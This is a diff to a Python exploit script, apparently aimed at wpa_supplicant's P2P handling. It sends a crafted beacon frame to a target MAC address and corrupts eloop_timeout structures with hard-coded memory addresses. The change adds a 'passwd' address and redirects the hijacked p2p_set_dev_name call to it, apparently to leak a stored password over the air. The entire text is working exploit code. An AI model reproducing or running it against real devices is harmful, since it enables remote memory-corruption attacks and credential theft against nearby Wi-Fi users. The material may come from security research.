@@ -20,11 +20,12 @@ args = parser.parse_args()
 iface = args.interface        # interface in monitor mode
 target = args.target          # target MAC address
 
-base  = 0x555ac65000         # base address of main module
+base  = 0x556d3c8000         # base address of main module
 
 eloop = 0x7fb6e32780          # eloop_timeout address
 p2    = 0x7fb6e2f320          # second part of payload
 p2p_data = 0x7fb6e98000
+passwd   = 0x7fb6e2b410
 
 eloop_next = base + 0x1f0770  # eloop next (&list terminates)
 wpa_printf = base + 0x027d48  # addr of wpa_printf
@@ -66,7 +67,7 @@ def build_beacon(dev_mac, client_mac):
         p64(eloop_next) +            # next: address of terminator
         p64(eloop) +                 # previous: address of ext_data1
         p64(0) + p64(0) +            # times set to 0 so it runs right away
-        p64(p2p_data) + p64(p2+0x38) +      # error level, address of msg 
+        p64(p2p_data) + p64(passwd) +      # error level, address of msg 
         p64(p2p_set_dev_name) +            # addr of wpa_printf to jump to 
         dev_name + b"\x00"*(8-len(dev_name)))
 
